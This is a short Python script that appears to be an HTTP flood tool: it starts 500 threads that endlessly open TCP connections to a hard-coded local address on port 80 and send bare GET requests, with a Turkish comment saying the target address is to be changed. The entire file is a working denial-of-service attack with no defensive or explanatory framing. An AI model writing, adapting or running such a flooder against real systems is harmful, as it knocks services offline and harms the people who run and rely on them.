import socket
import threading

target = '192.168.4.1'
port = 80

attack_num = 0

def flood_attack():
    while True:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET / HTTP/1.1\r\n").encode('ascii'), (target, port))
        s.sendto(("Host: 192.168.4.1" + "\r\n\r\n").encode('ascii'), (target, port)) # 192.16.4.2 degisecek
        
        s.close()


for i in range(500):
    thread = threading.Thread(target=flood_attack)
    thread.start()